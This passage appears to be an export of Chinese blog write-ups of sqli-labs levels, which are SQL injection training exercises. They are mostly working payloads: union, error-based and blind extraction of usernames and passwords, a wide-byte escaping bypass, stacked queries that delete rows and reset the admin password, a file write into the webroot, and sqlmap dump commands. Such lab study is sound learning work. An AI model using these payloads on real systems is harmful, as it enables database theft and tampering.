<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;SET NAMES gbk&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
<p>通过这段源码，我们可以知道，id没有被单引号括起来所以addslashes起不到作用<br>直接payload即可</p>
</li>
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 order by 4 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,version(),database() --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,2,(select group_concat(username,0x3a,password) from users) #</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="36-37-宽字节注入"><a href="#36-37-宽字节注入" class="headerlink" title="36-37(宽字节注入)"></a>36-37(宽字节注入)</h2><ol>
<li>测试并判断注入类型<br>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_quotes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$string</span>);    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
我们可以注意到这里有个mysql_real_escape_string()函数<br>下列字符受影响：</li>
</ol>
<ul>
<li>\x00</li>
<li>\n</li>
<li>\r</li>
<li>\</li>
<li>’</li>
<li>“</li>
<li>\x1a<br>那么直接用%df绕过</li>
</ul>
<ol start="2">
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1%df&#x27; order by 4 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,version(),database() --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(select database()) --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,(select group_concat(username,0x3a,password) from users)--+</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>第37关<br>和第34关差不多，这一关网上有说按第34关第1种方法能成功，但我没成功<br>因此我选择第2种，使用burp抓包注入。</li>
</ul>
<h2 id="38-41-堆叠注入"><a href="#38-41-堆叠注入" class="headerlink" title="38-41(堆叠注入)"></a>38-41(堆叠注入)</h2><ol>
<li>测试并判断注入类型<br>首先查看源码，发现这样一条语句<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>)</span><br></pre></td></tr></table></figure>
mysqli_multi_query()函数作用是：执行一个SQL语句，或者多个使用分号分隔的SQL语句。<br>详细可见：<a href="https://www.php.net/manual/zh/mysqli.multi-query.php#:~:text=mysqli_multi_query%20%28mysqli%20%24link%2C%20string%20%24query%29%3A%20bool%20%E6%89%A7%E8%A1%8C%E4%B8%80%E4%B8%AA%20SQL,%E8%AF%AD%E5%8F%A5%E3%80%82%20%E8%A6%81%E8%8E%B7%E5%BE%97%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C%E4%B8%AD%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%BB%93%E6%9E%9C%E9%9B%86%EF%BC%8C%E8%AF%B7%E4%BD%BF%E7%94%A8%20mysqli_use_result%20%28%29%20%E6%88%96%20mysqli_store_result%20%28%29%20%E5%87%BD%E6%95%B0%E3%80%82">mysqli_multi_query</a></li>
</ol>
<p>那么，当我们看到这条语句时，就可以注意能否使用<strong>堆叠注入</strong>了。<br>所谓堆叠注入，简单地说，是能够同时注入多条语句。<br>实际遇到很少，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。</p>
<ol start="2">
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; order by 4 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,version(),database() --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(select database()) --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,(select group_concat(username,0x3a,password) from users)--+</span><br></pre></td></tr></table></figure>
</li>
<li><p>增删改<br>这里示例一个增，也即为插入数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; ;insert into users(id,username,password)values(100,&#x27;772211&#x27;,&#x27;112277&#x27;);</span><br><span class="line">?id=100</span><br></pre></td></tr></table></figure>
<p>先后输入这两条语句，可以看到插入成功<br>示例一个删</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) ;delete from users where id=1;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li><p>第39关<br>与第38关相比差不多，只不过第39关不需要单引号</p>
</li>
<li><p>第40关<br>与第38关相比差不多，只不过第40关的闭合方式是’)</p>
</li>
<li><p>第41关<br>与38关差不多，也可堆叠注入</p>
</li>
</ul>
<h2 id="42-45-联合注入或堆叠注入"><a href="#42-45-联合注入或堆叠注入" class="headerlink" title="42-45(联合注入或堆叠注入)"></a>42-45(联合注入或堆叠注入)</h2><ol>
<li><p>测试并判断注入类型<br>查看源码，在login.php中注意到这样的语句</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>];</span><br></pre></td></tr></table></figure>
<p>我们可以发现，username被过滤了，但是password没有被过滤<br>因此我们可以考虑从password处进行注入<br>然后，通过对堆叠注入的尝试，我们发现也是可行的。<br>于是，我们可以有两种方式。<br>一是常规方式，二是通过堆叠注入修改管理员密码从而登录</p>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(username,&#x27;:&#x27;,password),2 from users #</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改管理员密码(可以直接做)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;update users set password=&#x27;111111&#x27;  where username=&#x27;admin&#x27;#</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li><p>第43关<br>与第42关差不多，只不过闭合方式为’)</p>
</li>
<li><p>第44关<br>与第42关差不多，只是不能使用报错注入</p>
</li>
<li><p>第45关<br>与第43关差不多，只是闭合方式为’)</p>
</li>
</ul>
<h2 id="46-47-报错注入和读写文件"><a href="#46-47-报错注入和读写文件" class="headerlink" title="46-47(报错注入和读写文件)"></a>46-47(报错注入和读写文件)</h2><ol>
<li><p>测试并判断注入类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=1</span><br></pre></td></tr></table></figure>
<p>显示有id,username,password的表格<br>可以直接得到需要的信息，但在实际情况中，这样是不够的。<br>也可以倒序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=1 desc</span><br></pre></td></tr></table></figure>
<p>这里可用的注入方式很多<br>报错注入，时间盲注，双查询注入，函数注入<br>下面以报错注入为例</p>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and updatexml(1,concat(0x7e,database(),0x7e),1)</span><br><span class="line">?sort=-1 and updatexml(1,concat(0x7e,version(),0x7e),1)</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),0x7e),1)</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1),0x7e),1)</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and updatexml(1,concat(0x7e,(select concat_ws(username,&#x27;:&#x27;,password) from users limit 0,1),0x7e),1)</span><br></pre></td></tr></table></figure>
</li>
<li><p>写入查询记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=1 into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-46\\111.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020--+</span><br></pre></td></tr></table></figure>
<p>用十六进制代替<?php phphinfo();?></p>
</li>
</ol>
<ul>
<li>第47关<br>与第46关相比差不多，只是闭合方式为’</li>
</ul>
<h2 id="48-53-布尔盲注"><a href="#48-53-布尔盲注" class="headerlink" title="48-53(布尔盲注)"></a>48-53(布尔盲注)</h2><ol>
<li><p>测试并判断注入类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;   无信息，只知道出错</span><br></pre></td></tr></table></figure>
<p>可以发现，现在无法使用报错注入了<br>那我们就要用到久违的盲注了。</p>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and if((ascii(substr(database(),1,1))=115),sleep(10),1) --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(10),1);--+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and if(ascii(substring((select column_name from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database()) limit 0,1),1,1))=101,sleep(10),1);--+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and if(ascii(substr((select username from security.users order by id limit 0,1),1,1))=68,sleep(10),1);--+</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li><p>第49关<br>与第48关相比差不多，只是闭合方式为’</p>
</li>
<li><p>第50关<br>与第48关相比差不多，因为源码中存在mysqli_multi_query,可以堆叠注入</p>
</li>
<li><p>第51关<br>与第50关相比差不多，只是闭合方式为’</p>
</li>
<li><p>第52关<br>与第50关相比差不多</p>
</li>
<li><p>第53关<br>与第51关相比差不多</p>
</li>
</ul>
<h2 id="54-57-完结训练"><a href="#54-57-完结训练" class="headerlink" title="54-57(完结训练)"></a>54-57(完结训练)</h2><ol>
<li><p>测试并判断注入类型<br>就像回到了开始~</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1  显示正常</span><br><span class="line">?id=1&#x27;  无错误信息，但显示不正常</span><br></pre></td></tr></table></figure>
<p>推测闭合方式为’</p>
</li>
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;order by 4 --+  无错误信息，但显示不正常</span><br><span class="line">?id=1&#x27;order by 3 --+  显示正常</span><br></pre></td></tr></table></figure>
<p>字段数为3</p>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,version(),database() --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;challenages&#x27; --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;8k8nkr7hq5&#x27; --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1) union select 1,group_concat(secret_2GAF),3 from 8k8nkr7hq5 --+</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li><p>第55关<br>与第54关差不多，闭合方式变更为)</p>
</li>
<li><p>第56关<br>与第54关差不多，闭合方式变更为’)</p>
</li>
<li><p>第57关<br>与第54关差不多，闭合方式变更为”</p>
</li>
</ul>
<h2 id="58-65-完结训练"><a href="#58-65-完结训练" class="headerlink" title="58-65(完结训练)"></a>58-65(完结训练)</h2><ol>
<li><p>测试并判断注入类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;  显示报错信息</span><br></pre></td></tr></table></figure>
<p>由此闭合方式为’<br>因为只有5次机会，所以我们采用报错注入比较快</p>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;challenges&#x27;),0x7e),1) --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;6ykqspiws7&#x27; limit 2,1),0x7e),1) --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,(select secret_K2GB from 6ykqspiws7),0x7e),1) --+</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li><p>第59关<br>与第58关相比差不多，只是闭合方式没有单引号</p>
</li>
<li><p>第60关<br>与第58关相比差不多，只是闭合方式为id&#x3D;-1”)</p>
</li>
<li><p>第61关<br>与第58关相比差不多，只是闭合方式为id&#x3D;-1’))</p>
</li>
<li><p>第62关<br>时间盲注，闭合方式’)</p>
</li>
<li><p>第63关<br>时间盲注，闭合方式’</p>
</li>
<li><p>第64关<br>时间盲注，闭合方式))</p>
</li>
<li><p>第65关<br>时间盲注，闭合方式”)</p>
</li>
</ul>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>sqli-labs只是SQL注入的开始。</p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入之sqli-labs_1+2</title>
    <url>/2022/11/07/sqli-labs_1+2/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>直接做题很痛苦，看不懂也没有基础。去补了一节课才明白很多原理。</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li>判断是否存在<strong>SQL注入</strong><br>方法是：<br>输入 ?id&#x3D;1’后是否有<strong>报错提示</strong></li>
</ol>
<ul>
<li>有提示。则存在SQL注入</li>
<li>无提示。不存在SQL注入<br>（说明：有提示即代表输入的数据带入到了数据库中查询，因此存在注入）<br>只有存在SQL注入才能继续往下执行。<br><img src="/simg/sqli-labs_1.png" alt="sqli-labs_1"></li>
</ul>
<ol start="2">
<li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>方法是：<br>首先输入：<br> ?id&#x3D;1 and 1&#x3D;2  或  ?id&#x3D;1’–+<br>由于之前我们已经输入过 ?id&#x3D;1’ 出现报错，<br>如果本次输入再次出现报错，说明是 数字型<br>否则即为 字符型</p>
</li>
<li><p>猜解SQL查询语句中的<strong>字段数</strong><br>为什么要猜解字段数？<br>因为我们已知存在SQL注入且其类型，可以使用联合查询注入。要使用联合注入首先得知道字段数。<br>（说明：联合查询Union:是把2个sql语句一起查询结果合并，且两张表需要有相同的列数和字段名，使用方式示例如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> A <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> B</span><br></pre></td></tr></table></figure>
<p>）<br>字段数可以通过order by语句得知。原理是通过order by语句查询，显示正常时是查询列数小于等于总列数。如果报错则该查询列数超过总列数。由此可得知字段数。示例语句如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;order by 3--+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆出显示位</strong><br>所谓爆出显示位，意思是查看分析哪些列是在页面显示的，这有利于我们后续的分析操作。<br>因此我们可以通过如下语句查询：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,3--+</span><br></pre></td></tr></table></figure>
<p>（说明：id&#x3D;-1的原因是为了让查询结果完全是union右边的值）</p>
</li>
<li><p>获取当前<strong>数据库名和数据库版本号</strong><br>获取数据库名可以执行一些后续操作，获取版本号可以判断哪些数据库操作能做哪些不能做。<br><a href="https://blog.csdn.net/weixin_34678198/article/details/113273999">MYSQL版本简单区别</a><br>因此我们可以通过如下语句查询：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,database(),version()--+</span><br></pre></td></tr></table></figure>
<p>这里用到了mysql的系统函数，下面列举5个常用mysql注入系统函数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">version()   		  MySQL版本</span><br><span class="line">user()     			  数据库用户名</span><br><span class="line">database() 			  数据库名</span><br><span class="line">@@datadir  			  数据库路径</span><br><span class="line">@@version_compile_os  操作系统版本</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong><br>首先需要介绍数据库默认库information_schema（5.0以上版本有该库）中的重要表</p>
</li>
</ol>
<ul>
<li><p>information_schema.schemata<br>schemata表中重要字段为schema_name，此字段涵盖数据库存在的所有库名字，我们可以通过查询语句得知我们想要的数据库都有哪些（database()只可得知当前数据库）<br>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(schema_name),3 from information_schema,schemata</span><br></pre></td></tr></table></figure>
<p>（说明：group_concat()的作用是将所有结果连接显示成一行）</p>
</li>
<li><p>information_schema.tables<br>tables表中重要字段为table_schema（库名）和table_name（表名）。可通过查询语句得到库名或表名，但由于table_schema与表字段table_name一一对应，有大量重复内容。只爆库建议使用schemata库查询<br>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(table_schema),group_concat(table_name) from information_schema.tables--+</span><br></pre></td></tr></table></figure>
<p>通过此方法可单独爆出某个数据库内的表名，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema like 0x646F75706870--+</span><br></pre></td></tr></table></figure>
<p>说明：通过匹配库爆表，需要将库名转换成哈希值或二进制，否则有时候会被转义从而报错</p>
</li>
<li><p>information_schema.columns<br>columns表中存在三个重要字段，分别为table_schema（库名字段）、table_name（表名字段）、column_name（字段）<br>可以直接利用这个表对数据库进行爆库爆表操作，只是仍然有很多重复字段，并不建议这么做。</p>
</li>
</ul>
<p>在本关中具体语句即为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure>

<ol start="7">
<li><p><strong>爆字段名</strong><br>通过sql语句查询知道当前数据库有4个表，根据表名知道可能用户的账号和密码是在users表中。因此接下来即为得到该表的字段名和内容。<br>示例语句为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure>
<p>说明：该语句查询information_schema数据库下的columns表的table_name字段。注意table_name字段在tables表和columns表中均存在。表示所有字段对应的表名。</p>
</li>
<li><p><strong>爆数据</strong><br>通过上述操作可知敏感字段username和password，接下来即查询该字段对应的内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(username,id,password) from users--+</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="sqlmap方式"><a href="#sqlmap方式" class="headerlink" title="sqlmap方式"></a>sqlmap方式</h2><p>下面步骤：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py --purge   清缓存</span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-1/?id=1&quot; --dbs   爆库</span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-1/?id=1&quot; -D database() --tables   爆表</span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-1/?id=1&quot; -D database() -T users --columns   爆字段</span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-1/?id=1&quot; -D database() -T users -C &quot;id,username,password&quot; --dump  爆数据</span><br></pre></td></tr></table></figure>
<p>其余详参我的博客：sqlmap使用</p>
<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><ul>
<li>此笔记为笔者初学sql注入时所写</li>
<li>以上示例主要是第一关，第一关和第二关差别只在字符型和数字型</li>
</ul>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p>
<p><a href="https://blog.csdn.net/weixin_48421613/article/details/107488560">关于sql注入暴库爆表爆字段</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_13+14+15+16</title>
    <url>/2022/11/10/sqli-labs_13-16/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>知识都是前面已经出现过的，只是提交方式不同，没什么难度。</p>
<span id="more"></span>

<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><ol>
<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) #  登录成功，但没有回显</span><br></pre></td></tr></table></figure>
<p>构造成功，然后使用时间盲注</p>
</li>
<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(length(database())&gt;7,sleep(10),1) #         判断数据库名长度</span><br><span class="line">admin&#x27;) and if(ascii(substring(database(),1,1))=115,sleep(10),1) #   判断数据库名第一个字符</span><br></pre></td></tr></table></figure>
<p>以此类推</p>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(10),1); #     判断表名</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substring((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))=101,sleep(10),1); #     判断字段名</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substr((select username from security.users order by id limit 0,1),1,1))=68,sleep(10),1); #</span><br><span class="line">判断数据</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第14关差不多，只是构造方式变成了双引号"><a href="#第14关差不多，只是构造方式变成了双引号" class="headerlink" title="第14关差不多，只是构造方式变成了双引号"></a>第14关差不多，只是构造方式变成了双引号</h2><h2 id="第15关和第11关差不多"><a href="#第15关和第11关差不多" class="headerlink" title="第15关和第11关差不多"></a>第15关和第11关差不多</h2><h2 id="第16关和第12关差不多"><a href="#第16关和第12关差不多" class="headerlink" title="第16关和第12关差不多"></a>第16关和第12关差不多</h2><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>有手就行</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_11+12</title>
    <url>/2022/11/10/sqli-labs_11+12/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本关开始，使用POST提交方式，但只是换了种提交方式，模式和前面的GET还是差不多。</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>猜解方式和之前差不多。这里稍微使用点和之前不一样的方式：</p>
